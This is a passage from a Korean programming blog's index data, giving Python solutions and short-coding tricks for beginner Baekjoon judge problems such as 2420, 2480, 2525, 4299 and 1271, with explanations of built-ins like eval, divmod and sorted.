알고리즘 캠프의 성공을 빌며 창호의 고민을 해결해주자. 문제풀이123a, b, c = map(int, input().split())if a+b+c &gt;= 100: print('OK')else: print([['Soongsil', 'Korea'][a&gt;b],'Hanyang'][min(a, b) &gt; c]) 간단하게 bool을 이용한 인덱싱으로 문제풀이를 하였다. 숏코딩 문제풀이12a = [*map(int, input().split())]print([['Soongsil', 'Korea', 'Hanyang'][a.index(min(a))], 'OK'][sum(a)&gt;99]) 위 코드와 같이 bool을 이용한 인덱싱으로 문제풀이을 하였다.","link":"/2021/02/12/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884-17388%EB%B2%88-%EB%AC%B8%EC%A0%9C/"},{"title":"백준 브론즈4 19944번 문제","text":"뉴비의 기준은 뭘까?2020 INPC는 IGRUS 뉴비들을 위해 열리는 대회입니다. 하지만 영수 할아버지나 인용 할아버지와 같이 14학번이지만 마음만은 뉴비인 어르신들 때문에 대회장이 TLE들의 파티가 되자 뉴비의 기준을 정의하기로 하였습니다. INPC 운영진들은 고심 끝에 뉴비를 1학년 혹은 2학년인 학생으로 정의 내렸고 뉴비를 정의하는 김에 올드비와 TLE도 정의 내리기로 하였습니다. 올드비는 N학년 이하이면서 뉴비가 아닌 학생으로 정의하기로 하였고 TLE은 뉴비도 아니고 올드비도 아닌 학생으로 정의하였습니다. N과 M이 주어졌을 때, M학년이 뉴비인지 올드비인지 TLE인지 구별해 주세요. 문제풀이12n, m = map(int, input().split())print([['OLDBIE!', 'NEWBIE!'][m &lt; 3], 'TLE!'][n &lt; m]) 풀이 설명문제 요약을 해보면, m이 1과 2일 때, NEWBIE! 출력 m이 n 이하면, OLDBIE! 출력 둘 다 아니면, TLE! 출력 이것들을 파이썬으로 변환하면, 1234567n, m = map(int, input().split())if m &lt; 3: print('NEWBIE!')elif m &lt;= n: print('OLDBIE!')else: print('TLE!') 가 된다. 이를 BOOL을 이용한 인덱싱으로 표현하였다.","link":"/2021/02/27/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884-19944%EB%B2%88-%EB%AC%B8%EC%A0%9C/"},{"title":"백준 브론즈4 11549번 문제","text":"Identifying teaBlind tea tasting is the skill of identifying a tea by using only your senses of smell and taste. As part of the Ideal Challenge of Pure-Tea Consumers (ICPC), a local TV show is organized. During the show, a full teapot is prepared and five contestants are handed a cup of tea each. The participants must smell, taste and assess the sample so as to identify the tea type, which can be: (1) white tea; (2) green tea; (3) black tea; or (4) herbal tea. At the end, the answers are checked to determine the number of correct guesses. Given the actual tea type and the answers provided, determine the number of contestants who got the correct answer. 문제풀이123a = int(input())b = [*map(int, input().split())]print(b.count(a)) Count 함수를 이용하여 특정값의 중복 수를 출력하였다.","link":"/2021/02/25/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884-23178117%EB%B2%88-%EB%AC%B8%EC%A0%9C/"},{"title":"백준 브론즈4 - 2420번 문제","text":"백준 브론즈4 2420번 문제사파리월드는 인터넷으로만 존재하는 미스테리한 나라이다. 사파리월드에는 2개의 서브도메인이 seunghwan.royal.gov.sw와 kyuhyun.royal.gov.sw 이 있는데, 이것이 couple.royal.gov.sw으로 합쳐질 것이다. 그러나 도메인 관리 센터 SWNIC(센터장: 김동규)에는 엄격한 룰이 있다. 두 서브도메인을 합칠 때, 유명도의 차이가 너무 차이나지 않을 경우에만 두 서브도메인을 결혼시키는 것이다. 서브도메인의 유명도는 정수이다. 두 서브도메인의 유명도가 주어졌을 때, 그 차이를 구하는 프로그램을 작성하시오.Link : https://www.acmicpc.net/problem/2420 문제풀이12a, b = map(int, input().split())print(abs(a-b)) Abs 함수를 이용하여 문제 풀이를 하였다.Abs 함수는 절대값을 구하는 함수이다. 숏코딩 문제풀이1print(abs(eval(input().replace(' ','-')))) Eval 함수와 Replace 함수를 이용하여 문제풀이를 하였다.Eval 함수는 ::-2–5::라는 문자열을 받아서 계산할 것이다.","link":"/2021/01/21/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884-2420%EB%B2%88-%EB%AC%B8%EC%A0%9C/"},{"title":"백준 브론즈4 - 2480번 문제","text":"백준 브론즈4 2480번 문제1에서부터 6까지의 눈을 가진 3개의 주사위를 던져서 다음과 같은 규칙에 따라 상금을 받는 게임이 있다. 1. 같은 눈이 3개가 나오면 10,000원+(같은 눈)1,000원의 상금을 받게 된다. 2. 같은 눈이 2개만 나오는 경우에는 1,000원+(같은 눈)*100원의 상금을 받게 된다. 3. 모두 다른 눈이 나오는 경우에는 (그 중 가장 큰 눈)*100원의 상금을 받게 된다.예를 들어, 3개의 눈 3, 3, 6이 주어지면 상금은 1,000+3100으로 계산되어 1,300원을 받게 된다. 또 3개의 눈이 2, 2, 2로 주어지면 10,000+21,000 으로 계산되어 12,000원을 받게 된다. 3개의 눈이 6, 2, 5로 주어지면 그중 가장 큰 값이 6이므로 6100으로 계산되어 600원을 상금으로 받게 된다.3개 주사위의 나온 눈이 주어질 때, 상금을 계산하는 프로그램을 작성 하시오. 문제풀이123456a = list(map(int, input().split()))if len(set(a)) == 3: print(max(a) * 100)elif len(set(a)) == 2: if a.count(a[0]) == 1: print(1000 + a[1] * 100) else: print(1000 + a[0] * 100)else: print(10000 + a[0] * 1000) Set 함수로 중복된 숫자를 제거하고, Len 함수로 List 안에 숫자의 갯수를 확인하여 중복 갯수를 확인하였다.중복 갯수가 2개인 경우, 중복된 값이 식에 들어가야함으로 별도로 어느 숫자가 중복인지 검사하여 결과를 구하였다. 숏코딩 문제풀이12a,b,c=sorted(input().split())print(['1'+b,c][a&lt;b&lt;c]+'000'[a&lt;c:]) 한번에 보고 이해하기 힘든 코드이다.Sorted 함수를 이용하여 입력받은 숫자들을 정렬하여 변수에 넣어줬다. 이러는 이유는 슬라이싱을 이용하기 위함이다. 문제의 조건은 밑과 같다 - 3개 동일 -&gt; 3개 중 아무 하나 - 2개 중복 -&gt; 중복된 숫자 - 중복 X -&gt; 가장 큰수 즉, 중복된 숫자와 가장 큰 수를 구해야하는게 이 문제의 핵심이다. ['1'+b, c][a&lt;b&lt;c] 이 코드에서 1은 중복된 숫자가 있을 경우 더해질 10000과 1000의 1를 뜻한다.이해가 안가는 사람도 있을 것이다.입력된 숫자가 ‘3 2 3’이면 변수에 넣어질 때 정렬이 됨으로 a = 2, b = 3, c = 3이 된다.변수가 str 타입이므로 숫자 더하기가 아닌 문자 더하기으로 계산이 되기 때문에 ['1'+b, c]은 ['13', 3]이 된다.그 후 중복이 있는지 없는지를 확인하였다. -&gt; [a&lt;b&lt;c]는 b=c 임으로 False가 나오게 된다. False은 0으로 취급할 수 있기 때문에 최종 나오는 결과는 13이 나오게 된다. 만약 중복값이 없다면 a&lt;b&lt;c가 True가 됨으로 가장 큰 수인 C가 나오게 된다. 위에 중복값이 있는지 없는지를 확인하였다. 이제 각 상황에 맞게 10000의 자리인지 1000의 자리인지 100의 자리인지를 확인해야한다. 이는 a&lt;c를 이용하여 확인하였다. 3개가 중복이면 a=c가 됨으로 False가 나오고 000이 더해지게 된다. 중복 2개 or 중복이 없으면, True가 나와서 00이 된다.","link":"/2021/01/21/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884-2480%EB%B2%88-%EB%AC%B8%EC%A0%9C/"},{"title":"백준 브론즈4 - 2525번 문제","text":"백준 브론즈4 2525번 문제KOI 전자에서는 건강에 좋고 맛있는 훈제오리구이 요리를 간편하게 만드는 인공지능 오븐을 개발하려고 한다. 인공지능 오븐을 사용하는 방법은 적당한 양의 오리 훈제 재료를 인공지능 오븐에 넣으면 된다. 그러면 인공지능 오븐은 오븐구이가 끝나는 시간을 분 단위로 자동적으로 계산한다.또한, KOI 전자의 인공지능 오븐 앞면에는 사용자에게 훈제오리구이 요리가 끝나는 시각을 알려 주는 디지털 시계가 있다.훈제오리구이를 시작하는 시각과 오븐구이를 하는 데 필요한 시간이 분단위로 주어졌을 때, 오븐구이가 끝나는 시각을 계산하는 프로그램을 작성하시오.Link : 2525번: 오븐 시계 문제풀이12345678910111213141516a, b= map(int, input().split())c = int(input())d = b+cif d &lt; 60: print(a, d)else: while True: a += 1 if a &gt; 23: a = 0 d = d-60 if d &lt; 60: break print(a, d) 무한루프와 조건문을 써서 해결했지만, 효율성은 너무 떨어지는 문제 풀이이다. 좀 더 간단하게 수정하겠다. 숏코딩 문제풀이12t = eval( input().replace(' ','*60+') ) + int( input() )print(t//60%24,t%60) 이 코드는 첫번째 입력값인 시와 분을 분 단위로 수정하여 두번째 입력값과 더한 후 시와 분으로 나누어 출력하였다.","link":"/2021/01/21/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884-2525%EB%B2%88-%EB%AC%B8%EC%A0%9C/"},{"title":"백준 브론즈4 - 2530번 문제","text":"백준 브론즈4 2530번 문제KOI 전자에서는 건강에 좋고 맛있는 훈제오리구이 요리를 간편하게 만드는 인공지능 오븐을 개발하려고 한다. 인공지능 오븐을 사용하는 방법은 적당한 양의 오리 훈제 재료를 인공지능 오븐에 넣으면 된다. 그러면 인공지능 오븐은 오븐구이가 끝나는 시간을 초 단위로 자동적으로 계산한다.또한, KOI 전자의 인공지능 오븐 앞면에는 사용자에게 훈제오리구이 요리가 끝나는 시각을 알려 주는 디지털 시계가 있다.훈제오리구이를 시작하는 시각과 오븐구이를 하는 데 필요한 시간이 초 단위로 주어졌을 때, 오븐구이가 끝나는 시각을 계산하는 프로그램을 작성하시오.2530번: 인공지능 시계 문제풀이1234a, b, c = map(int, input().split())d = int(input())e = a * 3600 + b * 60 + c + dprint(e//3600%24, e//60%60, e%60)","link":"/2021/01/21/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884-2530%EB%B2%88-%EB%AC%B8%EC%A0%9C/"},{"title":"백준 브론즈4 - 2588번 문제","text":"백준 2588번 문제곱셈(세 자리 수) × (세 자리 수)는 다음과 같은 과정을 통하여 이루어진다. (1)과 (2)위치에 들어갈 세 자리 자연수가 주어질 때 (3), (4), (5), (6)위치에 들어갈 값을 구하는 프로그램을 작성하시오.Link : https://www.acmicpc.net/problem/2753 1234567num1, num2 = map(int, open(0))num3 = num1 * (num2 % 10)num4 = num1 * (num2 % 100 // 10)num5 = num1 * (num2 // 100)print(f'{num3}\\n{num4}\\n{num5}\\n{num1*num2}') 이 문제는 사칙연산만 안다면 풀 수 있으므로 자세한 설명은 넘어가겠다.","link":"/2020/12/30/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884-2588%EB%B2%88-%EB%AC%B8%EC%A0%9C/"},{"title":"백준 브론즈4 - 2752번 문제","text":"백준 브론즈4 2752번 문제동규는 세수를 하다가 정렬이 하고싶어졌다.숫자 세 개를 생각한 뒤에, 이를 오름차순으로 정렬하고 싶어 졌다.숫자 세 개가 주어졌을 때, 가장 작은 수, 그 다음 수, 가장 큰 수를 출력하는 프로그램을 작성하시오. 문제풀이12a = map(int, input().split())print(*sorted(a)) Sorted 함수를 사용하여 정렬 후 출력하였다.print 함수 안에 있는 ::*::는 ::Asterisk::를 뜻하며, 컨테이너 타입의 데이터를 Unpacking할 때 쓴인다.쉽게 말해 리스트 안에 있는 모든 데이터를 밖으로 꺼내준다는 뜻으로 생각하면 된다. 숏코딩 문제풀이1print(*sorted(input().split(),key=int)) 굳이 설명을 할 필요가 없을 것 같아 코드 설명은 안하겠다. Sort 함수 Vs Sorted 함수Sort 함수 123a = [3, 2, 1]a.sort()print(a) # 출력 [1, 2, 3] Sorted 함수 123a = [3, 2, 1]print(sorted(a)) # 출력 [1, 2, 3]print(a) # 출력 [3, 2, 1] Sort 함수는 실제 리스트의 순서가 변경이 되며, Sorted 함수의 경우 실제 리스트의 순서는 변화가 없었다. 성능의 비교스택오버플로우에서 찾아보니, Sort 함수가 Sorted 함수보다 약 2% 빠르다는 결과를 알려주었습니다.","link":"/2021/01/21/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884-2752%EB%B2%88-%EB%AC%B8%EC%A0%9C/"},{"title":"백준 브론즈4 - 2753번 문제","text":"백준 2753번 문제윤년연도가 주어졌을 때, 윤년이면 1, 아니면 0을 출력하는 프로그램을 작성하시오.윤년은 연도가 4의 배수이면서, 100의 배수가 아닐 때 또는 400의 배수일 때이다.예를 들어, 2012년은 4의 배수이면서 100의 배수가 아니라서 윤년이다. 1900년은 100의 배수이고 400의 배수는 아니기 때문에 윤년이 아니다.하지만, 2000년은 400의 배수이기 때문에 윤년이다.Link : https://www.acmicpc.net/problem/2753 123a = int(input())if a%4 == 0 and a%100 != 0 or a%400 == 0: print(1)else: print(0)","link":"/2020/12/30/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884-2753%EB%B2%88-%EB%AC%B8%EC%A0%9C/"},{"title":"백준 브론즈4 4299번 문제","text":"AFC 웜블던원섭이는 잉글랜드 4부리그 풋볼 리그 2에서 활약하는 AFC 윔블던을 좋아한다. 이 팀은 2002년 윔블던 FC가 밀턴 킨스로 연고 이전을 감행하자 윔블던의 서포터들이 스스로 나서 창단한 팀이다. 윔블던 FC는 1988년에 당시 최고의 팀인 리버풀을 꺾고 FA컵을 우승하면서 엄청난 활약을 했었다. 하지만 1989년 4월 15일 축구역사상 최대 비극적인 사건 중 하나인 힐스보로 참사가 발생하였고, 1990년 1월 테일러 리포트가 발표되었다. 1991년, 상위권 리그 팀은 반드시 홈 경기장을 좌석제로 바꿔야 한다는 테일러 리포트의 내용에 따라 윔블던은 홈 구장이었던 플로 레인을 떠나게 되었다. 이때부터 10년동안 임시로 근처 클럽이었던 크리스털 팰리스와 경기장을 공유하기 시작했고 점점 재정적인 어려움을 겪었다. 결국 2002년 윔블던에서 약 90km정도 떨어진 밀턴 킨스로 연고지를 이전하는 초유의 사태가 벌어졌으며, 2004년 윔블던 FC는 파산하게 된다. 윙클만은 클럽을 산 뒤, 7월 클럽의 이름을 밀턴 킨스 돈스 FC(이하 MK 돈스)로 바꾼다. 한국에서 이 소식을 들은 원섭이는 엄청난 분노했고, 어서 빨리 MK 돈스를 경기장에서 이기는 모습을 보고싶어했다. 하지만, MK 돈스는 2004년 3부리그에 참가했지만, 그 때 AFC 윔블던은 8부리그에 참가하고 있었다. 두 팀이 공식 경기에서 만나려면 FA Cup밖에 기회가 없었다. 하지만, FA Cup은 하부 리그 팀은 낮은 라운드부터 대회에 참가하고, 대진은 추첨이므로 두 팀이 만나는 것은 불가능하다 생각했다. AFC 윔블던은 2002년 클럽의 역사를 9부리그에서 시작했지만, 2004년 8부리그, 2005년 7부리그, 2008년 6부리그, 2009년 5부리그로 점점 승격하였다. 그리고 2011년, 창단 9년만에 AFC 윔블던은 4부리그(리그2)에 승격하였다. MK 돈스는 2004년부터 2시즌(06-07, 07-08)을 제외하고는 항상 3부리그에서 활동했다. 이제 MK 돈스가 강등당하거나 AFC 윔블던이 승격을 하면 리그에서 두 팀간의 경기를 볼 수 있다. 2012년 12월 2일. 불가능할 것 같았던 사건이 일어났다. 2012-13 FA Cup 2라운드 에서 두 팀이 맞붙게 된 것이었다. 어서 빨리 이 경기를 보고 싶었던 원섭이는 FA Cup을 중계해주는 SBS ESPN의 편성표를 검색해보았다. 하지만, 두 팀간의 경기는 한국인에게 별로 관심을 끌지 못하는 경기였기 때문에, 중계가 예정되어 있지 않았다. 원섭이는 잉글랜드에 거주하는 지수에게 경기 결과를 물어봤다. 지수는 축구에는 큰 관심이 없지만 원섭이를 괴롭히는 것을 좋아하는 친구다. 지수는 두 팀의 최종 점수를 알려주는 대신, 두 팀이 득점한 점수의 합과 차를 알려주었다. MK 돈스와 AFC 윔블던의 점수의 합과 차가 주어졌을 때, 최종 점수를 구하는 프로그램을 작성하시오. 참고로 우리나라도 비슷한 경우가 있다. 2007년 부천 SK의 제주 연고지 이전을 반대하던 서포터들은 부천FC 1995를 창단했다. 이 팀은 2013년부터 K리그에 참가한다. 또, AFC 윔블던과 자매 결연 관계를 맺고 있다. 문제풀이1234567x, y = map(int, input().split())if x+y &lt; 0 or x-y &lt; 0 or (x+y)%2: print(-1)else: a = (x+y)//2 b = a-b print(max(a, b), min(a, b)) 요즘 자료구조와 알고리즘 강의에서 생각하고 코딩하는 방식을 배울 수 있었다. 이제부터는 생각 후 코딩을 실천할 생각이다. 문제 정리 입력 : 두 축구팀의 점수 합, 차 입력 조건 : 0 &lt;= 입력값 &lt; 1000 출력 : 두 축구팀의 점수 출력 조건 : 큰 수부터 출력, 합과 차가 갖는 경기 결과는 -1 출력 문제를 공식화 하자면,x는 입력값 합, y는 입력값 차일 때,x = a+by = a-b으로 볼 수 있다. 이때 우리가 찾아야 하는 값은 a, b이다. x+y = a+b+a-b이므로, x+y = 2a가 된다.즉, a = (x+y)/2라는 공식이 성립된다. a를 구했으니, b도 구해주자.y = a-b이므로, y = (x+y)/2 - b 가 성립된다.b만을 구하기 위해 y - (x+y)/2 = -b로 변경하고, 양수의 b을 구하기 위해 양쪽에 -1를 곱해주었다.b = (x+y)/2 - y이라는 공식이 성립된다. x-y = a+b-(a-b) -&gt; 2b = x-y -&gt; (x-y)/2 = b라는 공식도 가능하다. 하지만 보다 짧은 코드를 구하기 위해 위와 같은 방식으로 b를 구하였다. 왜 x+y로 b를 안 구하는 이유는 x+y로 b를 구하는 공식을 직접해보니, b의 값이 음수로 나온다. 코드로 b의 값을 절대값으로 변경하는 방식으로 하면 정답으로 처리 될 것이다. 저 공식이 맞는지 확인하려면 직접 시도하면 된다. 문제를 시나리오를 하자면, 1234567점수 -&gt; 합, 차 0 0 -&gt; 0 01 0 -&gt; 1 11 1 -&gt; 2 02 1 -&gt; 3 12 2 -&gt; 4 03 1 -&gt; 4 2 으로 생각할 수 있다.여기서 규칙이 있는데, 차가 0이면 점수가 같다는 것을 알 수 있다. 즉, 출력의 조건에 맞지 않는다는 것이다. 이를 예외 케이스로 (x+y)%2 == 0 이거나 b == 0으로 처리하면 되는데 아무래도 공식이 더 짧은 (x+y)%2 == 0으로 예외 처리하였다. 이를 의사코드로 정리하였다. x, y를 입력 받는다. 만약 x+y &lt; 0 or x-y &lt; 0 or (x+y)%2 == 0이면 -1 출력 위 조건이 아니라면, a = (x+y)//2, b = (x+y)//2-y를 구하고 둘 중 큰 수를 먼저 출력한다.","link":"/2021/02/16/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884-4299%EB%B2%88-%EB%AC%B8%EC%A0%9C/"},{"title":"백준 브론즈4 - 5532번 문제","text":"백준 브론즈4 5532번 문제상근이는 초등학교에 다닐 때, 방학 숙제를 남들보다 먼저 미리 하고 남은 기간을 놀았다. 방학 숙제는 수학과 국어 문제 풀기이다.방학은 총 L일이다. 수학은 총 B페이지, 국어는 총 A페이지를 풀어야 한다. 상근이는 하루에 국어를 최대 C페이지, 수학을 최대 D페이지 풀 수 있다.상근이가 겨울 방학동안 숙제를 하지 않고 놀 수 있는 최대 날의 수를 구하는 프로그램을 작성하시오.5532번: 방학 숙제 문제풀이12a = list(map(int, open(0)))print(a[0] - max([a[1]//a[3], a[1]//a[3]+1][a[1]%a[3]!=0], [a[2]//a[4], a[2]//a[4]+1][a[2]%a[4]!=0])) 사칙연산과 인덱싱을 이용한 문제풀이다.하지만 엄청 가독성이 떨어진다. Math 라이브러리를 이용하여 간단하게 수정하겠다.위 코드가 이해가 안 간다면, 10162번 문제풀이를 참고. 123import matha = list(map(int, open(0)))print(a[0] - max(math.ceil(a[1]/a[3]), math.ceil(a[2]/a[4]))) Math 라이브러리(수학 관련 라이브러리)의 Ceil 함수를 이용하여 간편하게 풀이하였다.Ceil 함수는 소수점이 있을 경우 올림을 해주는 함수이다. 이 기능을 이용하여 쓸데없는 인덱싱을 안 쓸 수 있었다. 숏코딩 문제풀이12a = list(map(int, open(0)))print(a[0]+min(-a[1]//a[3],-a[2]//a[4])) 이 코드는 기본 문제풀이와 같은 원리이지만, 추가적인 기능을 이용하였다.파이썬의 경우 음수일 경우 나눈 나머지는 올림처리가 된다는 것이다.양수에선 25 // 6은 4이지만, -25 // 6은 -5이다.","link":"/2021/01/21/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884-5532%EB%B2%88-%EB%AC%B8%EC%A0%9C/"},{"title":"백준 브론즈4 - 5543번 문제","text":"백준 5543번 문제상근날드상근날드에서 가장 잘 팔리는 메뉴는 세트 메뉴이다. 주문할 때, 자신이 원하는 햄버거와 음료를 하나씩 골라, 세트로 구매하면, 가격의 합계에서 50원을 뺀 가격이 세트 메뉴의 가격이 된다.햄버거는 총 3종류 상덕버거, 중덕버거, 하덕버거가 있고, 음료는 콜라와 사이다 두 종류가 있다.햄버거와 음료의 가격이 주어졌을 때, 가장 싼 세트 메뉴의 가격을 출력하는 프로그램을 작성하시오.Link : https://www.acmicpc.net/problem/5543 12345678menu = [ i for i in map(int, open(0)) ]sum = []for i in range(0,3): sum.append(menu[i] + menu[3]) sum.append(menu[i] + menu[4]) print(sorted(sum)[0]-50) list를 사용하여 문제해결을 하였다.하지만 많이 부족하다. 사실 최소값을 구하는 건 가장 작은 수 2개를 구해서 더해주면 되는데 위 방식은 모든 경우의 수를 구하여, 정렬시킨 것이라 비효율적이다.효율적으로 수정하겠다. 12*p,q,r = map(int,open(0))print(min(p)+min(q,r)-50) 2번째 코드는 위에 설명한 대로 최소값 2개를 구하여 더하는 코드이다.1번째 코드를 보면 좀 생소한 방식을 확인할 수 있다.*p,q,r = map(int, open(0))는 10개를 입력시 뒤에서 2개 빼고 앞의 8개는 p에 리스트로 저장이 된다.뒤의 2개는 q, r에 저장이 되어서 음료의 최소값을 구하기가 더 수월하였다. 12*p,q,r = map(int,open(0)) # 입력 : 1,2,3,4,5print(p) # 출력 : [1, 2, 3]","link":"/2020/12/30/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884-5543%EB%B2%88-%EB%AC%B8%EC%A0%9C/"},{"title":"백준 브론즈4 - 5575번 문제","text":"타임 카드JOI 상사는 직원의 근무시간을 타임 카드로 관리하고있다. 직원들은 전용 장비를 사용하여 타임 카드에 출근 시간을 기록한다. 근무를 마치고 퇴근할 때도 타임 카드에 퇴근 시간을 기록한다. 타임카드에서 사용하는 시간단위는 24 시간제를 사용한다. 보안상의 이유로 직원들의 출근 시간은 7시 이후이다. 또한, 모든 직원은 23시 이전에 퇴근한다. 직원의 퇴근 시간은 항상 출근 시간보다 늦다. 입력으로 JOI 상사의 3 명의 직원 A 씨, B 씨, C 씨의 출근 시간과 퇴근 시간이 주어 졌을 때 각 직원의 근무시간을 계산하는 프로그램을 작성하라. 문제풀이 나는 work_time이라는 함수를 따로 만들어서 시간 계산 후 계산 결과값을 출력하였다. work_time 함수는 입력값을 리스트에 저장한 변수를 매개변수로 입력받아 초단위로 계산하여 출근 시간과 퇴근 시간을 빼주어 나온 값을 시분초 단위로 계산한 함수이다. 숏코딩 문제풀이 해당 풀이는 3명의 입력값을 모두 받고 출력하는 것이 아닌, 한 명의 입력값을 입력받아서 계산 후 출력하는 것을 3번 반복한 코드이다. 또한 한줄로 되어있어서 그렇지, 풀어서 보면 어렵지 않은 코드이다.","link":"/2021/02/07/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884-5575%EB%B2%88-%EB%AC%B8%EC%A0%9C/"},{"title":"백준 브론즈4 - 5596번 문제","text":"백준 5596번 문제대한고등학교에 재학 중인 민국이와 만세는 4과목(정보, 수학, 과학, 영어)에 대한 시험을 봤습니다. 민국이와 만세가 본 4과목의 점수를 입력하면, 민국이의 총점 S와 만세의 총점 T 중에서 큰 점수를 출력하는 프로그램을 작성하세요. 다만, 서로 동점일 때는 민국이의 총점 S를 출력하세요. 5596번: 시험 점수 문제풀이1234a = map(int, input().split())b = map(int, input().split())print(max(sum(a), sum(b))) Sum 함수에 List를 넣으면, 자동으로 List의 합계를 구해는 점을 이용하여 풀이하였다. 숏코딩 문제풀이1print(max(sum(map(int,i.split())) for i in open(0))) Open 함수와 Split 함수를 적절히 사용하여 숏코딩을 하였다.'100 80 70 60'를 입력하면, 바로 i.split()에 의하여 ['100', '80', '70', '60']으로 변하게 된다.이를 Map 함수를 이용하여 각 item를 int형으로 변환하게 된다. 나머지는 기존 문제풀이와 같다.","link":"/2021/02/01/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884-5596%EB%B2%88-%EB%AC%B8%EC%A0%9C/"},{"title":"백준 브론즈4 5893번 문제","text":"17배상근이는 이진수 곱셈에 어려움을 겪는 여자친구를 위한 프로그램을 만들려고 한다. 상근이의 여자친구는 항상 이진수에 17을 곱한다. 즉, 이진수 N이 입력으로 들어오면 17을 곱한 다음 이진수로 출력하는 프로그램을 작성하시오. 문제풀이1print(str(bin(int(input(), 2)*17))[2:]) 풀이 설명입력 조건 : n은 2진수이며 0이 없다. 자리수는 0&lt;n&lt;1000 출력 조건 : n의 17배를 2진수로 출력 2진수 값 입력받기 10진수로 변환하여 곱하기 17 17배한 10진수를 이진수로 변환하여 출력.","link":"/2021/02/19/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884-5893%EB%B2%88-%EB%AC%B8%EC%A0%9C/"},{"title":"백준 브론즈5 - 1000번 문제","text":"백준 1000번 문제A+BLink : https://www.acmicpc.net/problem/1000 1print(int(input())+int(input())) 간단하게 생각할 수 있는 코드이다.input로 값을 입력받아 int 함수를 이용하여 문자에서 정수로 데이터타입을 변경하여 더하여 print 함수를 이용하여 출력하였다. 이 코드를 좀 더 python스럽게 만들어 보자. 1print(eval('+'.join(input()))) eval, join 함수를 사용하여 python스럽게 아주 간단하게 변경되었다.join과 eval에 대하여 알아보자. 문자열 삽입(join)Link : https://wikidocs.net/13#join 문자열의 문자 사이에 문자를 삽입하는 함수이다. 1print('+'.join('1234')) # 1+2+3+4 출력 위와 같이 문자열인 1234의 문자 사이에 +를 삽입되었다.python스럽게 고친 코드도 이를 이용하여 입력 받은 문자열에 +를 삽입하였다.허나 이상한 부분이 있다. join은 문자열의 문자 사이에 문자를 넣은 함수이지 계산을 하는 함수는 아니다.그럼 어떻게 계산을 할 수 있을지는 eval함수에 답이 있다. evalLink : https://wikidocs.net/32#eval eval함수는 실행 가능한 문자열을 실행한 결과값을 돌려주는 마법의 함수이다. 1234print(&quot;'Hi' + '!!!'&quot;) # 'Hi' + '!!!' 출력print(eval(&quot;'Hi' + '!!!'&quot;)) # Hi!!! 출력print(eval('+'.join('1234'))) # 10 출력 위와 같이 실행 가능한 문자를 실행해주는 함수이다.자세한 예제를 보고 싶다면 programiz 사이트에서 참고하면 좋다. Link : https://www.programiz.com/python-programming/methods/built-in/eval","link":"/2020/11/06/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%885-1001%EB%B2%88-%EB%AC%B8%EC%A0%9C/"},{"title":"백준 브론즈5 - 1271번 문제","text":"백준 1271번 문제엄청난 부자2link : https://www.acmicpc.net/problem/1271 12a, b = map(int, input().split())print(f'{a//b}\\n{a%b}') 1001번 문제와 같은 방식으로 풀이를 했다.다만 틀린 점은 print함수의 문자열 앞에 f가 있다는 점이다.f의 뜻은 fomat이라는 뜻이다. 원래 이 기능은 생긴지 얼마 안되었다.이 기능이 없기 전까지는 print(‘{0}\\n{1}’.fomat(a//b, a%b))와 같이 fomat함수를 사용하였다.하지만 가독성이 떨어져서 문자열 앞에 f를 표시하는 것으로 변경되었고, 문자열 안에 바로 변수를 선언하여서 가독성을 높였다. 이제 좀 더 python스럽게 변경해보자. 1print(*divmod(*map(int,input().split()))) 특이한 것이 있다. 저 *은 무엇인가?? 곱하기인가?아니다. *은 파이썬이 지원하는 많은 연산자 중 하나인 Asterisk이다. Asterisk파이썬에서는 *는 곱셈 이상의 여러 의미를 갖는 연산이 가능케한다. 그 중 위의 코드는 컨테이너 타입의 데이터를 Unpacking할 때 쓰이는 Asterisk이다. 12345print('None Asterlisk : ', map(int, input().split()), '\\n')# None Asterlisk : &lt;map object at 0x10e4f20a0&gt; 출력print('Asterlisk : ', *map(int, input().split()), '\\n')# Asterlisk : 100 10 출력 123456a = [1, 2, 3, 4]print('None Asterlisk : ', a, '\\n')# None Asterlisk : [1, 2, 3, 4] print('Asterlisk : ', *a, '\\n')# Asterlisk : 1 2 3 4 예시 코드를 보니 아주 명확하게 구별이 가능했다.혹시 더 알아보고 싶으면 아래의 링크로 알아보면 된다.link : https://mingrammer.com/understanding-the-asterisk-of-python/ *은 해결했으니, divmod함수를 알아보자. divmodlink : https://wikidocs.net/32#divmod divmod함수는 이름 뜻대로 두 개의 인자값을 나눈 몫과 나머지를 튜플 형태로 return 해주는 함수이다. 12345print(divmod(7,3))# (2, 1) 출력print(divmod(100, 10))# (10, 0) 출력","link":"/2020/11/07/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%885-1271%EB%B2%88-%EB%AC%B8%EC%A0%9C/"},{"title":"백준 브론즈5 - 1550번 문제","text":"백준 1550번 문제16진수link : https://www.acmicpc.net/problem/1550 1print(int(input(), 16)) int함수에 옵션을 주어서 간단하게 문제를 해결하였다. int함수의 옵션은 밑의 주소에서 확인하면 된다.link : https://wikidocs.net/32#int","link":"/2020/11/08/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%885-1550%EB%B2%88-%EB%AC%B8%EC%A0%9C/"},{"title":"백준 브론즈5 - 2338번 문제","text":"백준 2338번 문제긴자리 계산link : https://www.acmicpc.net/problem/2338 12a, b = map(int, 